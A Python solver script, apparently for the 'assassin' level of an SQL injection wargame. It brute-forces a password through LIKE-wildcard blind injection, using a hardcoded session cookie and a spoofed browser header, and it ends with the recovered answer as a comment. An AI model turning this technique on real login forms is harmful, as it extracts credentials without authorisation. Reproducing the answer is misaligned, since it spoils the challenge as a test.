#!/usr/local/bin/python3

import urllib.request
from urllib.parse import quote
from string import digits
from string import ascii_lowercase

key = ""
guestkey = ""
findadmin = False

for i in range(0, 8):
    if not findadmin:
        key = guestkey
    findadmin = False
    for j in digits + ascii_lowercase:
        url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="
        data = key + "{}".format(j) + ("_" * (7 - i))
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=pdah5igtkcp024tlbfueevv8b0")
        re.add_header(
            "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
        req = urllib.request.urlopen(re)

        result = req.readline()
        print(result)

        if str(result).find("Hello guest") != -1:
            guestkey += j
            print ("g : " + guestkey)

        if str(result).find("Hello admin") != -1:
            key += j
            print ("a : " + key)
            findadmin = True
            break
print (key)

# 832edd10
